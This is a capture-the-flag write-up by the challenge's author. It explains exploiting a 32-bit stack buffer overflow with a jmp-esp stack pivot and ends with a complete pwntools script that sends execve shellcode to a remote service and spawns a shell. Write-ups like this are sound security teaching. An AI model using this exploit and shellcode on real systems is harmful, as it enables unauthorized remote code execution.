---
layout: post
title: X-CTF - b0verfl0w (Pwn)
modified:
categories: blog
excerpt: "Write up for b0verfl0w an exploitation challenge I wrote for X-CTF quals 2016."
tags: []
image:
  feature:
date: 2016-04-22T01:03:15+08:00
---

X-CTF is a capture the flag competition in Singapore organized by NUS Greyhats. The online qualifiers took place over the weekend of 9 - 10 April 2016. Halfway through the competition, we realize that the challenges were solved pretty quickly by the participants, and thus I wrote some new challenges. The following two challenges were by me.

# b0verfl0w
**Category:** Pwn  
**Description**
[b0verfl0w](/resources/files/x-ctf/c343c76a9bc18021a2ebda77730d85e1) is running at 188.166.226.181:4242.

---

# Solution

So from the name of the challenge, this is an obvious buffer overflow challenge. However, obvious it would not be as simple as a classic buffer overflow. In this case, we're given the binary without the source code, so first thing to do is to analyze the binary for the buffer overflow vulnerability, and to determine if there are any useful gadgets we can use to build an exploit.

We got a 32-bit ELF executable here.

{% highlight sh linenos %}
→ file *
c343c76a9bc18021a2ebda77730d85e1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped
→ ./boverflow

======================

Welcome to X-CTF 2016!

======================
What's your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.Segmentation fault (core dumped)
{% endhighlight %}

The vulnerability is very obviously on the name input. There are many ways to continue from here, and what I am writing is just one of the way.

Using GDB with peda, I am able to quickly find the amount of offset required until the EIP register using the pattern search plugin.
{% highlight sh linenos %}
gdb-peda$ pattern create 100 /tmp/input
Writing pattern of 100 chars to filename "/tmp/input"
gdb-peda$ r < /tmp/input
Starting program: /home/vagrant/CTF/X-CTF/xctf-2016-challs/qualifiers/pwn/b0verfl0w/grader/b0verfl0w_dep/boverflow < /tmp/input

======================

Welcome to X-CTF 2016!

======================
What\'s your name?
Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb.
Program received signal SIGSEGV, Segmentation fault.
gdb-peda$ pattern search
Registers contain pattern buffer:
EBP+0 found at offset: 32
EIP+0 found at offset: 36
{% endhighlight %}

So what this tells me is that I'll have to fill the first 36 bytes of input with junk before filling the 4 bytes with the memory address I'd like the program to jump to.

In a classical buffer overflow, what I'd do is to fill the 36 bytes with shellcode, and then modify the EIP value to jump to where my shellcode is located. However, this is only feasible if (1) I know the memory address of the shellcode, (2) DEP is not enabled and (3) if ASLR was not enabled, it'd be slightly easier to bruteforce the memory address of the shellcode.

In this case, DEP is disabled. However, we do not have any information of the memory layout or the libc addresses (which would allows us to craft a return-to-libc or ROP exploit).

However, upon closer inspection, you will notice that there are some ROP gadgets provided in the binary that could allow us to perform stack pivoting and thus execute our shellcode. Conveniently it's contained in a function called `hint` ;).

{% highlight objdump linenos %}
80484fd <hint>:
 80484fd:   55                      push   %ebp
 80484fe:   89 e5                   mov    %esp,%ebp
 8048500:   83 ec 24                sub    $0x24,%esp
 8048503:   c3                      ret
 8048504:   ff e4                   jmp    *%esp
 8048506:   c3                      ret
 8048507:   b8 01 00 00 00          mov    $0x1,%eax
 804850c:   5d                      pop    %ebp
 804850d:   c3                      ret
{% endhighlight %}

We see a `jmp $esp` followed by a `ret` instruction that would allow us to perform a stack pivot. 

Memory layout:  
| Shellcode | Offset | 0x08048504 | Shellcode to perform stack pivoting |

At the point when the program jumps to 0x08048504, $esp would be pointing at the start of `Shellcode to perform stack pivoting`, so what is needed here to do a stack pivot is `sub 0x28,$esp` followed by `jmp $esp` again. However, you need to convert the instructions into their respective hex representation. We perform a sub 0x28 because the `shellcode + payload + 0x08048504` takes up 40 bytes and we want the next `jmp $esp` to jump to the start of our shellcode.

For the shellcode portion, you can use any simple shellcode off the internet.

I wrote the exploit in python and used the pwntools library to simplify the entire exploitation process.  
Final exploit:
{% highlight python linenos %}
from pwn import *

r = remote('188.166.226.181', 4242)
Shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
Payload = "A"*13
JmpESPGadget = "\x04\x85\x04\x08"
ShellcodeStackPivot = "\x83\xec\x28\xff\xe4"
payload = Shellcode + Payload + JmpESPGadget + ShellcodeStackPivot
print payload
r.send(payload)
r.interactive()
{% endhighlight %}

Running our exploit provides us with a shell. :)

{% highlight bash linenos %}
$ cat flag.txt
XCTF{b0verfl0wed_w3ll_d0ne}
{% endhighlight %}

And we have our flag! 

